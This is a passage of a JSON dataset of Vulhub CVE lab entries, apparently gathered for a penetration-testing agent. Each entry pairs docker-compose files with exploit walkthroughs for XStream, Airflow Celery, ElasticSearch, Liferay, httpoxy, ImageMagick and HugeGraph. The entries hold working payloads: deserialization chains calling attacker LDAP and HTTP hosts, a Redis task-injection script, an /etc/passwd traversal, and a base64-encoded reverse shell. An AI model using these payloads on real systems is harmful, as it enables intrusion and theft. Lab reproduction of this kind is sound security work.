follows:\n\n```\nPOST / HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nConnection: close\nContent-Type: application/xml\nContent-Length: 3181\n\n<sorted-set>\n  <javax.naming.ldap.Rdn_-RdnEntry>\n    <type>ysomap</type>\n    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>\n      <m__DTMXRTreeFrag>\n        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>\n          <m__size>-10086</m__size>\n          <m__mgrDefault>\n            <__overrideDefaultParser>false</__overrideDefaultParser>\n            <m__incremental>false</m__incremental>\n            <m__source__location>false</m__source__location>\n            <m__dtms>\n              <null/>\n            </m__dtms>\n            <m__defaultHandler/>\n          </m__mgrDefault>\n          <m__shouldStripWS>false</m__shouldStripWS>\n          <m__indexing>false</m__indexing>\n          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>\n            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>\n              <javax.sql.rowset.BaseRowSet>\n                <default>\n                  <concurrency>1008</concurrency>\n                  <escapeProcessing>true</escapeProcessing>\n                  <fetchDir>1000</fetchDir>\n                  <fetchSize>0</fetchSize>\n                  <isolation>2</isolation>\n                  <maxFieldSize>0</maxFieldSize>\n                  <maxRows>0</maxRows>\n                  <queryTimeout>0</queryTimeout>\n                  <readOnly>true</readOnly>\n                  <rowSetType>1004</rowSetType>\n                  <showDeleted>false</showDeleted>\n                  <dataSource>ldap://java-chains-ip:50389/x</dataSource>\n                  <listeners/>\n                  <params/>\n                </default>\n              </javax.sql.rowset.BaseRowSet>\n              <com.sun.rowset.JdbcRowSetImpl>\n                <default/>\n              </com.sun.rowset.JdbcRowSetImpl>\n            </fPullParserConfig>\n            <fConfigSetInput>\n              <class>com.sun.rowset.JdbcRowSetImpl</class>\n              <name>setAutoCommit</name>\n              <parameter-types>\n                <class>boolean</class>\n              </parameter-types>\n            </fConfigSetInput>\n            <fConfigParse reference='../fConfigSetInput'/>\n            <fParseInProgress>false</fParseInProgress>\n          </m__incrementalSAXSource>\n          <m__walker>\n            <nextIsRaw>false</nextIsRaw>\n          </m__walker>\n          <m__endDocumentOccured>false</m__endDocumentOccured>\n          <m__idAttributes/>\n          <m__textPendingStart>-1</m__textPendingStart>\n          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>\n          <m__pastFirstElement>false</m__pastFirstElement>\n        </m__dtm>\n        <m__dtmIdentity>1</m__dtmIdentity>\n      </m__DTMXRTreeFrag>\n      <m__dtmRoot>1</m__dtmRoot>\n      <m__allowRelease>false</m__allowRelease>\n    </value>\n  </javax.naming.ldap.Rdn_-RdnEntry>\n  <javax.naming.ldap.Rdn_-RdnEntry>\n    <type>ysomap</type>\n    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n      <m__obj class='string'>test</m__obj>\n    </value>\n  </javax.naming.ldap.Rdn_-RdnEntry>\n</sorted-set>\n```\n\nIt can be seen that `touch /tmp/success` has been successfully executed:\n\n![](3.png)\n\nIf something goes wrong with the POC and Java version, the POC have to be modified by changing ``<__overrideDefaultParser>false</__overrideDefaultParser>`` to ``<__useServicesMechanism>false</__useServicesMechanism>``.\n"
  },
  {
    "filename": "CVE-2020-11981.md",
    "filenamenomd": "CVE-2020-11981",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/airflow/CVE-2020-11981/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/airflow/CVE-2020-11981/exploit_airflow_celery.py\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/airflow/CVE-2020-11981/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 2382 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '3'\nx-airflow-common:\n  &airflow-common\n  image: vulhub/airflow:1.10.10\n  environment:\n    &airflow-common-env\n    AIRFLOW__CORE__EXECUTOR: CeleryExecutor\n    AIRFLOW__CORE__SQL_ALCHEMY_CONN: postgresql+psycopg2://airflow:airflow@postgres/airflow\n    AIRFLOW__CELERY__RESULT_BACKEND: db+postgresql://airflow:airflow@postgres/airflow\n    AIRFLOW__CELERY__BROKER_URL: redis://:@redis:6379/0\n    AIRFLOW__CORE__FERNET_KEY: ''\n    AIRFLOW__CORE__DAGS_ARE_PAUSED_AT_CREATION: 'true'\n    AIRFLOW__CORE__LOAD_EXAMPLES: 'true'\n    #AIRFLOW__API__AUTH_BACKEND: 'airflow.api.auth.backend.basic_auth'\n    AIRFLOW__API__AUTH_BACKEND: 'airflow.api.auth.backend.default'\n  user: \"${AIRFLOW_UID:-50000}:${AIRFLOW_GID:-50000}\"\n  depends_on:\n    redis:\n      condition: service_healthy\n    postgres:\n      condition: service_healthy\n\nservices:\n  postgres:\n    image: postgres:13-alpine\n    environment:\n      POSTGRES_USER: airflow\n      POSTGRES_PASSWORD: airflow\n      POSTGRES_DB: airflow\n    healthcheck:\n      test: [\"CMD\", \"pg_isready\", \"-U\", \"airflow\"]\n      interval: 5s\n      retries: 5\n\n  redis:\n    image: redis:5-alpine\n    ports:\n      - 6379:6379\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 5s\n      timeout: 30s\n      retries: 50\n\n  airflow-webserver:\n    <<: *airflow-common\n    command: webserver\n    ports:\n      - 8080:8080\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"--fail\", \"http://localhost:8080/health\"]\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n  airflow-scheduler:\n    <<: *airflow-common\n    command: scheduler\n    healthcheck:\n      test: [\"CMD-SHELL\", 'airflow jobs check --job-type SchedulerJob --hostname \"$${HOSTNAME}\"']\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n  airflow-worker:\n    <<: *airflow-common\n    command: worker\n    healthcheck:\n      test:\n        - \"CMD-SHELL\"\n        - 'celery --app airflow.executors.celery_executor.app inspect ping -d \"celery@$${HOSTNAME}\"'\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n  airflow-init:\n    <<: *airflow-common\n    command: initdb\n    environment:\n      <<: *airflow-common-env\n      _AIRFLOW_DB_UPGRADE: 'true'\n\n  flower:\n    <<: *airflow-common\n    command: flower\n    ports:\n      - 5555:5555\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"--fail\", \"http://localhost:5555/\"]\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/airflow/CVE-2020-11981/exploit_airflow_celery.py\n\n- Extension: .py\n- Language: python\n- Size: 1425 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nimport pickle\nimport json\nimport base64\nimport redis\nimport sys\nr = redis.Redis(host=sys.argv[1], port=6379, decode_responses=True,db=0) \nqueue_name = 'default'\nori_str=\"{\\\"content-encoding\\\": \\\"utf-8\\\", \\\"properties\\\": {\\\"priority\\\": 0, \\\"delivery_tag\\\": \\\"f29d2b4f-b9d6-4b9a-9ec3-029f9b46e066\\\", \\\"delivery_mode\\\": 2, \\\"body_encoding\\\": \\\"base64\\\", \\\"correlation_id\\\": \\\"ed5f75c1-94f7-43e4-ac96-e196ca248bd4\\\", \\\"delivery_info\\\": {\\\"routing_key\\\": \\\"celery\\\", \\\"exchange\\\": \\\"\\\"}, \\\"reply_to\\\": \\\"fb996eec-3033-3c10-9ee1-418e1ca06db8\\\"}, \\\"content-type\\\": \\\"application/json\\\", \\\"headers\\\": {\\\"retries\\\": 0, \\\"lang\\\": \\\"py\\\", \\\"argsrepr\\\": \\\"(100, 200)\\\", \\\"expires\\\": null, \\\"task\\\": \\\"airflow.executors.celery_executor.execute_command\\\", \\\"kwargsrepr\\\": \\\"{}\\\", \\\"root_id\\\": \\\"ed5f75c1-94f7-43e4-ac96-e196ca248bd4\\\", \\\"parent_id\\\": null, \\\"id\\\": \\\"ed5f75c1-94f7-43e4-ac96-e196ca248bd4\\\", \\\"origin\\\": \\\"gen1@132f65270cde\\\", \\\"eta\\\": null, \\\"group\\\": null, \\\"timelimit\\\": [null, null]}, \\\"body\\\": \\\"W1sxMDAsIDIwMF0sIHt9LCB7ImNoYWluIjogbnVsbCwgImNob3JkIjogbnVsbCwgImVycmJhY2tzIjogbnVsbCwgImNhbGxiYWNrcyI6IG51bGx9XQ==\\\"}\"\ntask_dict = json.loads(ori_str)\ncommand = ['touch', '/tmp/airflow_celery_success']\nbody=[[command], {}, {\"chain\": None, \"chord\": None, \"errbacks\": None, \"callbacks\": None}]\ntask_dict['body']=base64.b64encode(json.dumps(body).encode()).decode()\nprint(task_dict)\nr.lpush(queue_name,json.dumps(task_dict))\n\n```\n\n",
    "readme": "# Apache Airflow Celery Broker Remote Command Execution (CVE-2020-11981)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Airflow is an open source, distributed task scheduling framework. In the version prior to 1.10.10, if the Redis broker (such as Redis or RabbitMQ) has been controlled by attacker, the attacker can execute arbitrary commands in the worker process.\n\nSince there are many components to be started, it may be a bit stuck. Please prepare more than 2G of memory for the use of the virtual machine.\n\nReferences:\n\n- <https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx>\n- <https://github.com/apache/airflow/pull/9178>\n\n## Vulnerability Environment\n\nExecute the following commands to start an airflow 1.10.10 server:\n\n```bash\n#Initialize the database\ndocker compose run airflow-init\n\n#Start service\ndocker compose up -d\n```\n\n## Exploit\n\nFor exploit this vulnerability, you have to get the write permission of the Celery broker, Redis. In Vulhub environment, Redis port 6379 is exposing on the Internet.\n\nThrough the Redis, you can add the evil task `airflow.executors.celery_executor.execute_command` to the queue to execute arbitrary commands.\n\nUse this script [exploit_airflow_celery.py](exploit_airflow_celery.py) to execute the command `touch /tmp/airflow_celery_success`\n\n```\npip install redis\npython exploit_airflow_celery.py [your-ip]\n```\n\nSee the results on the logs:\n\n```bash\ndocker compose logs airflow-worker\n```\n\n![](1.png)\n\nAs you can see, `touch /tmp/airflow_celery_success` has been successfully executed:\n\n```\ndocker compose exec airflow-worker ls -l /tmp\n```\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2015-3337.md",
    "filenamenomd": "CVE-2015-3337",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-3337/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-3337/Dockerfile\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-3337/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 72 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n es:\n   build: .\n   ports:\n    - \"9200:9200\"\n    - \"9300:9300\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-3337/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 144 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/elasticsearch:1.4.4\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nRUN set -ex \\\n    && plugin -install mobz/elasticsearch-head\n\n```\n\n",
    "readme": "# ElasticSearch Plug-in Directory Traversal (CVE-2015-3337)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nElasticSearch is a distributed, RESTful search and analytics engine.\n\nIn the ElasticSearch versions before 1.4.5 and 1.5.x before 1.5.2, a directory traversal vulnerability exists in ElasticSearch's plugin functionality that allows attackers to read arbitrary files on the system.\n\nReferences:\n\n- <https://nvd.nist.gov/vuln/detail/CVE-2015-3337>\n- <https://github.com/elastic/elasticsearch/issues/10828>\n\n## Vulnerability Description\n\nAfter installing a plugin with \"site\" functionality, an attacker can use `../` in the plugin directory path to traverse up the directory tree, leading to arbitrary file read. ElasticSearch installations without any plugins are not affected.\n\n## Environment Setup\n\nExecute the following commands to build and start an ElasticSearch server 1.4.4:\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nThe test environment comes with a pre-installed plugin: `elasticsearch-head`, which is a web front-end for ElasticSearch. More information about this plugin can be found at: <https://github.com/mobz/elasticsearch-head>\n\n## Vulnerability Reproduction\n\nTo exploit this vulnerability, send a request to read arbitrary files using directory traversal in the plugin path. For example, to read `/etc/passwd`, send a request to:\n\n```\nhttp://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd\n```\n\nNote: Do not access this URL directly in a browser.\n\n![](1.png)\n\n## Additional Information\n\nThe head plugin provides a web interface for ElasticSearch. You can access it at `http://your-ip:9200/_plugin/head/` to interact with your ElasticSearch cluster through a graphical interface.\n"
  },
  {
    "filename": "CVE-2020-7961.md",
    "filenamenomd": "CVE-2020-7961",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/liferay-portal/CVE-2020-7961/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/liferay-portal/CVE-2020-7961/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 86 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/liferay-portal:7.2.0-ga1\n   ports:\n    - \"8080:8080\"\n\n```\n\n",
    "readme": "# Liferay Portal CE Deserialization Remote Code Execution (CVE-2020-7961)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nLiferay Portal CE is an open-source platform for rapid website development. Versions 7.2.0 GA1 and earlier contain a deserialization vulnerability in the API interface, allowing attackers to execute arbitrary commands on the target server via crafted requests.\n\nReferences:\n\n- <https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html>\n- <https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay%20Portal%20CVE-2020-7961%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/>\n- <https://xz.aliyun.com/t/7499>\n- <https://xz.aliyun.com/t/7485>\n\n## Environment Setup\n\nExecute the following command to start Liferay Portal 7.2.0 GA1:\n\n```\ndocker compose up -d\n```\n\nAfter the container starts, visit `http://your-ip:8080` to access the default homepage. If the server fails to start, ensure your system has at least 2GB of memory.\n\n## Vulnerability Reproduction\n\nFirst, create and compile a malicious Java class:\n\n```java\n// javac LifExp.java\npublic class LifExp {\n    static {\n        try {\n            String[] cmd = {\"bash\", \"-c\", \"touch /tmp/success\"};\n            java.lang.Runtime.getRuntime().exec(cmd).waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\nStart an HTTP file server in the directory containing the class file:\n\n```\n$ ls\nLifExp.class  LifExp.java\n\n$ python3 -m http.server\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\nBecause the target uses a high Java version, use the `com.mchange.v2.c3p0.WrapperConnectionPoolDataSource` gadget chain. Generate a Jackson-compatible payload with [marshalsec](https://github.com/mbechler/marshalsec):\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://evil/ LifExp\n```\n\nHere, `http://evil/` is the address of your HTTP server, and `LifExp` is the malicious class name.\n\n![](1.png)\n\nModify the generated payload to match Liferay Portal's format (`+parameter_name:class_name=value`):\n\n```\n+defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c6966457870740017687474703a2f2f3137322e31372e302e313a383030302f740003466f6f;\"}\n```\n\nSend the payload in an HTTP POST request:\n\n```\nPOST /api/jsonws/invoke HTTP/1.1\nHost: your-ip:8080\nContent-Length: 1346\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\ncmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=o3lt8q1F&formDate=1585270368703&tableId=1&name=2&type=3&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c6966457870740017687474703a2f2f3137322e31372e302e313a383030302f740003466f6f;\"}\n```\n\n![](2.png)\n\nEnter the container and verify that `/tmp/success` has been created, indicating successful code execution:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2016-5385.md",
    "filenamenomd": "CVE-2016-5385",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/cgi/CVE-2016-5385/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/cgi/CVE-2016-5385/www/index.php\n- /home/yay/pentest-agent/vulhub/sites_no_md/cgi/CVE-2016-5385/nginx/default.conf\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/cgi/CVE-2016-5385/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 317 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n nginx:\n   image: nginx:1\n   volumes:\n    - ./www/index.php:/usr/share/nginx/html/index.php\n    - ./nginx/default.conf:/etc/nginx/conf.d/default.conf\n   depends_on:\n    - php\n   ports:\n    - \"8080:80\"\n php:\n   image: vulhub/php:httpoxy\n   volumes: \n    - ./www/index.php:/var/www/html/index.php\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/cgi/CVE-2016-5385/www/index.php\n\n- Extension: .php\n- Language: php\n- Size: 423 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\nuse GuzzleHttp\\Client;\n\nheader('Content-Type: application/json; charset=utf-8');\n\n$client = new Client([\n    // Base URI is used with relative requests\n    'base_uri' => 'http://httpbin.org',\n    // You can set any number of default request options.\n    'timeout'  => 2.0,\n]);\n\n$response = $client->get('http://httpbin.org/get');\n\n$body = $response->getBody();\n\necho $body;\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/cgi/CVE-2016-5385/nginx/default.conf\n\n- Extension: .conf\n- Language: ini\n- Size: 462 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:28:29\n\n### Code\n\n```ini\nserver {\n\tlisten 80 default_server;\n\tlisten [::]:80 default_server;\n\n\troot /usr/share/nginx/html;\n\n\tindex index.html index.php;\n\n\tserver_name _;\n\n\tlocation / {\n\t\ttry_files $uri $uri/ =404;\n\t}\n\n\tlocation ~ [^/]\\.php(/|$) {\n\t\tfastcgi_index index.php;\n\n\t\tinclude fastcgi_params;\n\n\t\tfastcgi_param  REDIRECT_STATUS    200;\n\t\tfastcgi_param  SCRIPT_FILENAME /var/www/html$fastcgi_script_name;\n\t\tfastcgi_param  DOCUMENT_ROOT /var/www/html;\n\t\tfastcgi_pass php:9000;\n\t}\n\n}\n```\n\n",
    "readme": "# CGI Application Environment Variable Injection by HTTPoxy (CVE-2016-5385)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nhttpoxy is a set of vulnerabilities that affect application code running in CGI, or CGI-like environments. It comes down to a simple namespace conflict:\n\n- RFC 3875 (CGI) puts the HTTP Proxy header from a request into the environment variables as `HTTP_PROXY`\n- `HTTP_PROXY` is a popular environment variable used to configure an outgoing proxy\n\nThis leads to a remotely exploitable vulnerability. See <https://httpoxy.org> for further principles description.\n\nCVE-2016-5385 is one of CVEs that assign for HTTPoxy, here are the full CVEs list:\n\n- CVE-2016-5385: PHP\n- CVE-2016-5386: Go\n- CVE-2016-5387: Apache HTTP Server\n- CVE-2016-5388: Apache Tomcat\n- CVE-2016-6286: spiffy-cgi-handlers for CHICKEN\n- CVE-2016-6287: CHICKEN’s http-client\n- CVE-2016-1000104: mod_fcgi\n- CVE-2016-1000105: Nginx cgi script\n- CVE-2016-1000107: Erlang inets\n- CVE-2016-1000108: YAWS\n- CVE-2016-1000109: HHVM FastCGI\n- CVE-2016-1000110: Python CGIHandler\n- CVE-2016-1000111: Python Twisted\n- CVE-2016-1000212: lighttpd\n\n## Vulnerable environment\n\nExecute following command to start a Web application depending on PHP 5.6.23 and GuzzleHttp 6.2.0.\n\n```\ndocker compose up -d\n```\n\nThis [Web page](www/index.php) get its origin IP address at `http://httpbin.org/get`:\n\n![](1.png)\n\nAt this moment, hostname IP is equal to original IP, no HTTP proxy.\n\n## Exploit\n\nSend a request with a crafted HTTP header that contains a available HTTP proxy address: `Proxy: http://*.*.122.65:8888/`:\n\n![](2.png)\n\nIt is obvious that the original address in the response has become the IP address of the proxy server.\n\nStart a Netcat server at the `*.*.122.65` instead of HTTP proxy, we can capture the original request:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2016-3714.md",
    "filenamenomd": "CVE-2016-3714",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2016-3714/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2016-3714/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2016-3714/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 201 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/imagemagick:6.9.2-10-php\n   command: php -t /var/www/html -S 0.0.0.0:8080\n   volumes:\n    - ./index.php:/var/www/html/index.php\n   ports:\n    - \"8080:8080\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2016-3714/index.php\n\n- Extension: .php\n- Language: php\n- Size: 472 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\n\nif (!empty($_FILES)):\n\n$ext = pathinfo($_FILES['file_upload']['name'], PATHINFO_EXTENSION);\nif (!in_array($ext, ['gif', 'png', 'jpg', 'jpeg'])) {\n    die('Unsupported filetype uploaded.');\n}\n\n$size = shell_exec(\"identify -format '%w x %h' {$_FILES['file_upload']['tmp_name']}\");\n\necho \"Image size is: $size\";\n\nelse:\n?>\n<form method=\"post\" enctype=\"multipart/form-data\">\n    File: <input type=\"file\" name=\"file_upload\">\n    <input type=\"submit\">\n</form>\n<?php\nendif;\n```\n\n",
    "readme": "# ImageMagick Imagetragick Command Injection (CVE-2016–3714)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nImageMagick is a free and open-source cross-platform software suite for displaying, creating, converting, modifying, and editing raster images.\n\nIn ImageMagick version before 6.9.3-9, insufficient filtering for filename passed to delegate's command allows remote code execution during conversion of several file formats. The CVE-2016-3714 is also called \"imagetragick\".\n\nReferences:\n\n- <https://imagetragick.com>\n- <https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html>\n- <https://github.com/ImageTragick/PoCs>\n\n## Environment Setup\n\nExecute the following command to start a PHP server that includes ImageMagick 6.9.2-10:\n\n```\ndocker compose up -d\n```\n\n## Exploit\n\nVisit `http://your-ip:8080/` to see an upload component.\n\nSend the following request:\n\n```\nPOST / HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarymdcbmdQR1sDse9Et\nContent-Length: 328\n\n------WebKitFormBoundarymdcbmdQR1sDse9Et\nContent-Disposition: form-data; name=\"file_upload\"; filename=\"1.gif\"\nContent-Type: image/png\n\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.0/oops.jpg\"|curl \"www.leavesongs.com:8889)'\npop graphic-context\n------WebKitFormBoundarymdcbmdQR1sDse9Et--\n```\n\nIt can be seen that `www.leavesongs.com:8889` has received the http request, after the curl command was executed successfully:\n\n![](2.png)\n\nPOC of getting a reverse shell：\n\n```\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d | bash`\"||id \" )'\npop graphic-context\n```\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2024-27348.md",
    "filenamenomd": "CVE-2024-27348",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/hugegraph/CVE-2024-27348/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/hugegraph/CVE-2024-27348/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 102 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/hugegraph:1.2.0\n    ports:\n      - \"8080:8080\"\n      - \"5005:5005\"\n\n```\n\n",
    "readme": "# Apache HugeGraph Unauthenticated Remote Code Execution (CVE-2024-27348)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache HugeGraph is a fast and highly scalable graph database. It provides graph database capabilities with complete features, excellent performance, and enterprise-level reliability.\n\nA remote code execution vulnerability exists in the Gremlin API of HugeGraph. Gremlin is a graph traversal language that can be implemented in various programming languages such as Groovy, Python, and Java. An attacker is able to use Gremlin API to execute Groovy based Gremlin commands without authentication, which can be used to execute arbitrary commands.\n\nIn theory, Apache HugeGraph will use the SecurityManager to restrict the Groovy scripts submitted by users. But the SecurityManager only checks thread names that start with \"gremlin-server-exec\" or \"task-worker\". This mechanism can be bypassed by using reflection to modify the current thread name, allowing arbitrary code execution.\n\nReferences:\n\n- <https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/>\n- <https://www.vicarius.io/vsociety/posts/remote-code-execution-vulnerability-in-apache-hugegraph-server-cve-2024-27348>\n- <https://github.com/Zeyad-Azima/CVE-2024-27348>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable HugeGraph server 1.2.0:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can access the HugeGraph RESTful API at `http://your-ip:8080`.\n\n## Vulnerability Reproduce\n\nSend a malicious Gremlin query through the Gremlin API endpoint to execute arbitrary commands:\n\n```\nPOST /gremlin HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json\nContent-Length: 777\n\n{\n    \"gremlin\": \"Thread thread = Thread.currentThread();Class clz = Class.forName(\\\"java.lang.Thread\\\");java.lang.reflect.Field field = clz.getDeclaredField(\\\"name\\\");field.setAccessible(true);field.set(thread, \\\"SL7\\\");Class processBuilderClass = Class.forName(\\\"java.lang.ProcessBuilder\\\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\\\"id\\\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = 